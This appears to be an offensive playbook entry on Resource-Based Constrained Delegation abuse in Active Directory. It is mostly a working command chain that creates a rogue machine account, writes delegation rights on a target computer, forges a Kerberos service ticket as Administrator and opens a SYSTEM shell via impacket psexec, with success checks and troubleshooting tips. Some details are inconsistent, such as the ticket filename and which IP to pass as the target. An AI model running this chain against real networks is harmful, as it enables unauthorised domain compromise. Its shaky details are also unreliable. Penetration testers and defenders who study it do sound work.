# Resource-Based Constrained Delegation (RBCD)

## When this applies

- AD environment where you have `WriteProperty` on the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
- AND you control a machine account (existing compromise OR you can create one — `ms-DS-MachineAccountQuota` ≥ 1, default 10).
- Goal: configure RBCD so your machine account can S4U2self/S4U2proxy as Administrator to the target — yielding SYSTEM on the target.

## Technique

Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target machine to allow your controlled machine account. Use S4U2self (request a TGS for yourself impersonating any user) + S4U2proxy (use that TGS to obtain a service ticket against the target). The result is a service ticket for the target as Administrator.

## Steps

```bash
# Requires: WriteProperty on target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# AND a machine account you control (create one or use existing compromised)

# Step 1: Create machine account (requires SeMachineAccountPrivilege, default quota=10)
impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'FakePass1!' \
  -dc-ip DC_IP 'domain/user:pass'
# Or: bloodyAD -d domain -u user -p pass --host DC_IP add computer FAKE$ 'FakePass1!'

# Step 2: Set RBCD — allow FAKE$ to act on behalf of users to target
impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write \
  -dc-ip DC_IP 'domain/user:pass'
# Or: bloodyAD -d domain -u user -p pass --host DC_IP add rbcd 'TARGET$' 'FAKE$'

# Step 3: S4U2self + S4U2proxy → get service ticket as Administrator
impacket-getST -spn cifs/TARGET.domain.com -impersonate Administrator \
  -dc-ip DC_IP 'domain/FAKE$:FakePass1!'
# Result: Administrator@cifs/TARGET.domain.com.ccache

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGET.domain.com.ccache
impacket-psexec -k -no-pass TARGET.domain.com
# Or: impacket-wmiexec / impacket-smbexec -k -no-pass TARGET.domain.com

# ⚠ -target-ip <DC_IP> on smbclient/psexec/wmiexec/secretsdump -k is required when the
#   target's hostname doesn't resolve via DNS or resolves to a different IP than the
#   KDC expects. Add it pre-emptively for any "-k -no-pass" command — the cost of
#   including it is zero, the cost of forgetting is hours of "STATUS_LOGON_FAILURE":
smbclient -k -no-pass //TARGET.domain.com/C$ -target-ip DC_IP
```

## Verifying success

- `impacket-psexec -k -no-pass TARGET.domain.com` lands a SYSTEM shell.
- `klist` (or `KRB5CCNAME`) shows a TGS for `cifs/TARGET.domain.com` issued to Administrator.

## Common pitfalls

- `MachineAccountQuota=0` on the domain → step 1 fails. Use an existing compromised computer object instead.
- DNS resolution issues — always add `-target-ip <DC_IP>` to any `-k -no-pass` command.
- AdminSDHolder-protected accounts (Administrator) can still be impersonated via S4U2self — the impersonation occurs at TGT level, not at ACL level.
- BloodHound's graph is FROZEN at collection time — after writing RBCD, re-collect or verify the next hop manually with bloodyAD/nxc.

## Tools

- impacket (`addcomputer`, `rbcd`, `getST`, `psexec`, `wmiexec`)
- bloodyAD
